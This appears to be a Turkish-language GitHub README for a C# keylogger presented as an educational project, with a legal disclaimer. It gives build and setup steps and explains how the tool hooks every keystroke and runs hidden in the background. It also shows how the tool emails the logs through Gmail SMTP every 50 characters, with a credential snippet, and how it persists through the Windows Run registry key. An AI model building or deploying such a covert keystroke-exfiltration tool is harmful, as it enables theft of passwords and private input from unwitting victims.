PROJE TAMAMEN EĞİTİM AMAÇLIDIR!!!!
zehradagasann/KlavyeDinlemeUygulaması
 # C# Eğitim Amaçlı Keylogger Projesi

Bu proje, Visual Studio ortamında C# dili kullanılarak geliştirilmiş, **tamamen eğitim ve araştırma amaçlı** bir keylogger uygulamasıdır. Projenin temel amacı, global klavye olaylarının (hooks) nasıl yakalandığını, arka plan işlemlerinin nasıl yönetildiğini, SMTP ile e-posta gönderimini ve Windows Registry (Kayıt Defteri) ile başlangıçta çalışma ayarlarının nasıl yapıldığını göstermektir.
Projenin denemeli şekilde gösterilmesi:

---

## ⚠️ ÖNEMLİ UYARI VE YASAL SORUMLULUK REDDİ

> Bu yazılım **yalnızca eğitim ve siber güvenlik farkındalığı yaratma amacıyla geliştirilmiştir.** Başka bir kişinin bilgisi ve rızası olmadan bilgisayarına bu tür bir yazılım yüklemek, kişisel verilerin gizliliğini ihlal eder. Bu eylem, TCK dahil olmak üzere birçok ülkenin yasalarına göre **yasa dışı olup ciddi hukuki ve cezai sonuçlar doğurabilir.**
>
> Bu kodun veya uygulamanın yasa dışı, kötü niyetli veya etik olmayan amaçlarla kullanılmasından doğacak hiçbir yasal sorumluluk kabul edilmemektedir. **Bu projeyi kullanarak tüm sorumluluğu üstlenmiş olursunuz.** Lütfen bu aracı sadece kendi sisteminizde, öğrenme ve test amacıyla kullanın.

---

## 🎯 Projenin Eğitim Hedefleri

*   **Global Klavye Kancaları (Hooks):** `HootKeys` gibi üçüncü parti bir kütüphane kullanarak sistem genelindeki klavye olaylarını nasıl dinleyeceğimizi öğrenmek.
*   **Veri Biriktirme ve Gönderme:** Yakalanan tuş vuruşlarını bir değişkende biriktirip belirli bir limite ulaşıldığında bu veriyi ağ üzerinden (e-posta ile) nasıl göndereceğimizi anlamak.
*   **SMTP Protokolü Kullanımı:** C# `System.Net.Mail` kütüphanesi ile Gmail gibi servisler üzerinden nasıl e-posta gönderileceğini kavramak.
*   **Windows'ta Kalıcılık (Persistence):** Bir uygulamanın, Windows Kayıt Defteri'ne (`Registry`) kendini ekleyerek her başlangıçta otomatik olarak nasıl çalıştırılabileceğini öğrenmek. Bu, siber güvenlikte "kalıcılık mekanizmaları"nı anlamak için önemli bir konsepttir.
*   **Arka Plan Uygulaması:** Bir Windows Forms uygulamasının görsel bir arayüz olmadan arka planda nasıl çalışabileceğini görmek.

---

## ✨ Projenin Özellikleri

*   **Geniş Karakter Desteği:** Standart alfanümerik karakterlerin yanı sıra Türkçe karakterleri (ğ, ü, ş, i, ö, ç), rakamları ve temel noktalama işaretlerini yakalar.
*   **Caps Lock Durum Takibi:** Caps Lock tuşunun durumuna göre büyük/küçük harf ayrımını doğru bir şekilde yapar.
*   **Veri Gönderimi:** Yakalanan tuş vuruşları 50 karaktere ulaştığında, belirlenen bir e-posta adresine logları otomatik olarak gönderir.
*   **Başlangıçta Otomatik Çalışma:** Uygulama ilk kez çalıştığında, kendini Windows `Run` kayıt defteri anahtarına ekleyerek sistem her yeniden başladığında otomatik olarak çalışır.

---

## 🛠️ Kurulum ve Çalıştırma

### Gereksinimler
*   **IDE:** Visual Studio 2022 veya daha yeni bir sürümü
*   **.NET Sürümü:** .NET Framework 4.7+
*   **Bağımlılık:** `HootKeys` kütüphanesi.

### Adımlar
1.  **Projeyi Klonlayın veya İndirin:**
    ```bash
    git clone https://github.com/[zehradagasann]/[games-zehradagasann].git
    ```

2.  **Projeyi Visual Studio'da Açın:**
    *   Proje klasöründeki `.sln` uzantılı dosyayı açın.

3.  **Bağımlılığı Yükleyin:**
    *   Proje, `HootKeys` adlı bir kütüphane kullanmaktadır. Bu kütüphaneyi projenize eklemeniz gerekir.
    *   Visual Studio'da `Tools > NuGet Package Manager > Package Manager Console` yolunu izleyin.
    *   Açılan konsola aşağıdaki komutu yazıp Enter'a basın:
      ```powershell
      Install-Package HootKeys
      ```

4.  **E-posta Bilgilerini Yapılandırın (ÇOK ÖNEMLİ):**
    *   `Form1.cs` dosyasını açın ve `Mail()` fonksiyonunu bulun.
    *   Aşağıdaki satırlardaki e-posta ve şifre bilgilerini **kendi bilgilerinizle** değiştirin:
      ```csharp
      istemci.Credentials = new System.Net.NetworkCredential("SENDER-EMAIL@gmail.com", "YOUR-APP-PASSWORD");
      // ...
      msj.From = new MailAddress("SENDER-EMAIL@gmail.com");
      msj.To.Add("RECEIVER-EMAIL@gmail.com");
      ```
    *   **Güvenlik Notu:** Gmail, artık standart şifrelerin bu tür uygulamalarda kullanılmasına izin vermemektedir. Bunun yerine Google Hesabınızda **"Uygulama Şifreleri" (App Passwords)** oluşturmanız gerekmektedir.

5.  **Derleyin ve Çalıştırın:**
    *   Projeyi derlemek için `F5` tuşuna basın veya `Debug > Start Debugging` menüsünü kullanın.
    *   Uygulama çalışmaya başladığında arka plana geçecektir. Klavye girişleriniz kaydedilecek ve 50 karaktere ulaştığında belirttiğiniz e-posta adresine gönderilecektir.

---

## ⚙️ Kodun Teknik Açıklaması

*   **`TuslariDinle()`:** Bu metot, `globalKeyboardHook` nesnesini başlatır ve dinlenmesi istenen tüm tuşları (`Keys` enum'ı) `HookedKeys` listesine ekler. Son olarak `KeyDown` olayına `TusKombinasyonu` metodunu atar.
*   **`TusKombinasyonu(object sender, KeyEventArgs e)`:** Bu, her tuşa basıldığında tetiklenen ana metottur.
    *   Gelen `e.KeyCode` değerini kontrol ederek basılan tuşu tespit eder.
    *   `if/else` blokları ile bu tuşun karakter karşılığını `log` adlı string değişkene ekler.
    *   `number` sayacını artırır ve sayaç 50'yi geçtiğinde `Mail()` metodunu çağırarak logları gönderir ve değişkenleri sıfırlar.
*   **`Mail()`:** `System.Net.Mail.SmtpClient` sınıfını kullanarak, önceden tanımlanmış kimlik bilgileriyle `smtp.gmail.com` sunucusu üzerinden e-posta gönderir.
*   **`Form1_Load(object sender, EventArgs e)`:** Uygulama ilk yüklendiğinde çalışır.
    *   `Control.IsKeyLocked(Keys.CapsLock)` ile Caps Lock'un başlangıç durumunu kontrol eder.
    *   `Microsoft.Win32.Registry` sınıfını kullanarak `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` anahtarına erişir ve uygulamanın yürütülebilir dosya yolunu (`Application.ExecutablePath`) bu anahtara ekler. Bu sayede uygulama kalıcı hale gelir.

---
